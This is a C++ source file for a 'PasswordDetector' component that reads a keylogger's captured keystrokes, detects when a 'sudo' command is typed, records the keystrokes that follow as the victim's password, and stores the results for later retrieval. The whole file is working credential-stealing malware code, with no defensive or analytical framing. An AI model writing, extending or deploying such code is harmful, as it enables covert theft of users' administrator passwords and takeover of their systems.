#include "PasswordDetector.h"

std::vector<std::string> PasswordDetector::capturedPasswords_;
std::mutex PasswordDetector::passwordsMtx_;
std::string PasswordDetector::lastBuffer_;
std::mutex PasswordDetector::bufferMtx_;
std::chrono::steady_clock::time_point PasswordDetector::passwordCaptureStartTime_;
bool PasswordDetector::isCapturingPassword_ = false;
std::string PasswordDetector::currentPassword_;

bool PasswordDetector::looksLikeCommand(const std::string& text) {
    if (text.empty()) return false;
    
std::vector<std::string> commonCommands = {
        "ls", "cd", "sudo", "apt", "brew", "git", // Unix
        "runas", "net user", "net localgroup", "powershell", "schtasks" // Windows
    };
    
    std::string lower = text;
    std::transform(lower.begin(), lower.end(), lower.begin(), ::tolower);
    lower.erase(0, lower.find_first_not_of(" \t"));
    
    for (const auto& cmd : commonCommands) {
        if (lower.find(cmd) == 0) {
            return true;
        }
    }
    
    return false;
}

bool PasswordDetector::isPasswordCharacter(char c) {
    return std::isalnum(c) || 
           c == '!' || c == '@' || c == '#' || c == '$' || c == '%' ||
           c == '^' || c == '&' || c == '*' || c == '(' || c == ')' ||
           c == '-' || c == '_' || c == '+' || c == '=' || c == '[' ||
           c == ']' || c == '{' || c == '}' || c == '|' || c == '\\' ||
           c == ';' || c == ':' || c == '\'' || c == '"' || c == '<' ||
           c == '>' || c == ',' || c == '.' || c == '?' || c == '/' ||
           c == '~' || c == '`';
}


void PasswordDetector::addPassword(const std::string& password) {
    if (password.empty()) return;
    
    std::lock_guard<std::mutex> lock(passwordsMtx_);
    
    for (const auto& existing : capturedPasswords_) {
        if (existing == password) {
            return;
        }
    }
    
    capturedPasswords_.push_back(password);
    
    if (capturedPasswords_.size() > MAX_PASSWORDS) {
        capturedPasswords_.erase(capturedPasswords_.begin());
    }
}

void PasswordDetector::analyzeKeylogBuffer(const std::string& newKeys) {
    if (newKeys.empty()) return;
    
    std::lock_guard<std::mutex> lock(bufferMtx_);
    
    lastBuffer_ += newKeys;
    
    if (lastBuffer_.length() > 10000) {
        lastBuffer_ = lastBuffer_.substr(lastBuffer_.length() - 5000);
    }
    
    auto now = std::chrono::steady_clock::now();
    
    for (char c : newKeys) {
        if (c == '\n' || c == '\r') {
            size_t lastNewline = lastBuffer_.rfind('\n', lastBuffer_.length() - newKeys.length() - 1);
            if (lastNewline == std::string::npos) {
                lastNewline = 0;
            }
            
            size_t lineStart = lastNewline + 1;
            size_t lineEnd = lastBuffer_.length() - newKeys.length() + (c == '\r' ? 1 : 0);
            
            if (lineStart < lineEnd && lineEnd <= lastBuffer_.length()) {
                std::string line = lastBuffer_.substr(lineStart, lineEnd - lineStart);
                
                size_t sudoPos = line.find("sudo");
                if (sudoPos != std::string::npos) {
                    isCapturingPassword_ = true;
                    passwordCaptureStartTime_ = now;
                    currentPassword_.clear();
                    continue;
                }
            }
            
            if (isCapturingPassword_ && !currentPassword_.empty()) {
                std::string password = currentPassword_;
                password.erase(0, password.find_first_not_of(" \t"));
                password.erase(password.find_last_not_of(" \t") + 1);
                
                if (password.length() >= 3 && password.length() <= 128) {
                    bool hasSpace = password.find(' ') != std::string::npos;
                    
                    if (!hasSpace) {
                        addPassword(password);
                    }
                }
                
                currentPassword_.clear();
                isCapturingPassword_ = false;
            }
        } else {
            if (isCapturingPassword_) {
                auto elapsed = std::chrono::duration_cast<std::chrono::seconds>(
                    now - passwordCaptureStartTime_).count();
                
                if (elapsed > PASSWORD_TIMEOUT_SECONDS) {
                    isCapturingPassword_ = false;
                    currentPassword_.clear();
                    continue;
                }
                
                if (isPasswordCharacter(c)) {
                    currentPassword_ += c;
                } else if (c == '\b' || c == 127) {
                    if (!currentPassword_.empty()) {
                        currentPassword_.pop_back();
                    }
                } else if (c == ' ') {
                    if (!currentPassword_.empty()) {
                        currentPassword_.clear();
                        isCapturingPassword_ = false;
                    }
                }
            }
        }
    }
}

std::string PasswordDetector::getLastPassword() {
    std::lock_guard<std::mutex> lock(passwordsMtx_);
    if (capturedPasswords_.empty()) {
        return "";
    }
    return capturedPasswords_.back();
}

std::vector<std::string> PasswordDetector::getAllPasswords() {
    std::lock_guard<std::mutex> lock(passwordsMtx_);
    return capturedPasswords_;
}

void PasswordDetector::clearPasswords() {
    std::lock_guard<std::mutex> lock(passwordsMtx_);
    capturedPasswords_.clear();
}

bool PasswordDetector::hasPassword() {
    std::lock_guard<std::mutex> lock(passwordsMtx_);
    return !capturedPasswords_.empty();
}
